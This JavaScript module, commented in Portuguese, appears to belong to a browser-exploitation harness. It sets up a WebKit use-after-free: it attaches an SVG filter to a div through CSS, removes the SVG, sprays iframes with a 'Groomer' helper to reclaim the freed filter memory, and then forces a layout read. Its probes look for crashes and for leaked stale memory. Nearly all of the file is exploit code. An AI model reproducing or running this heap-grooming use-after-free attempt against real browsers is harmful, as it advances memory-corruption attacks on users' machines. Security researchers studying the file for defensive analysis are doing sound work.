
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'SVG_CSS_FILTER_UAF',
    category: 'DOM',
    risk:     'CRITICAL',
    description:
        'UAF na Árvore de Renderização SVG. Um filtro complexo é aplicado a um nó do DOM via CSS. ' +
        'O elemento <filter> é destruído síncronamente enquanto um recálculo de layout é forçado. ' +
        'O RenderStyle C++ pode reter um ponteiro stale para o RenderSVGResourceFilter libertado.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        // Criamos o SVG com o filtro
        this.svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        this.svg.innerHTML = `
            <filter id="evilFilter">
                <feGaussianBlur stdDeviation="5" />
                <feColorMatrix type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0" />
            </filter>`;
        this.sandbox.appendChild(this.svg);

        // Criamos a cobaia que usa o filtro
        this.target = document.createElement('div');
        this.target.style.width = "100px";
        this.target.style.height = "100px";
        this.target.style.background = "red";
        this.target.style.filter = "url(#evilFilter)"; // Liga o C++ CSS ao C++ SVG
        this.sandbox.appendChild(this.target);

        // Força o WebKit a construir a RenderTree
        void this.target.offsetWidth;
    },

    trigger: function() {
        try {
            // O GATILHO: Destruímos a árvore SVG que contém o filtro
            this.svg.remove();
            this.svg = null;

            // Tentamos sobrepor a memória do RenderSVGResourceFilter com iframes pesados
            let trash = Groomer.sprayDOM('iframe', 150);

            // A BOMBA: Pedimos as coordenadas do target.
            // O WebKit tem que calcular o CSS, que ainda aponta para o filtro destruído!
            this.results.rect = this.target.getBoundingClientRect();
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O C++ sobreviveu ao layout sem craschar?
        s => s.results.error || 'Layout Concluído',
        
        // Probe 1: O recálculo demorou muito? (Indica hash collision ou engine hang)
        s => s.results.rect ? s.results.rect.width : 0,

        // Probe 2: STALE DATA LEAK
        s => {
            // Se o motor leu a memória dos iframes em vez do filtro, o tamanho calculado 
            // da caixa pode saltar de 100 para um número absurdo (lixo da RAM).
            if (s.results.rect && s.results.rect.width > 200) {
                return s.results.rect.width; // Retorna o valor bruto para o HUD gritar STALE DATA!
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.target.remove(); } catch(e) {}
        this.target = null;
        this.results = {};
    }
};
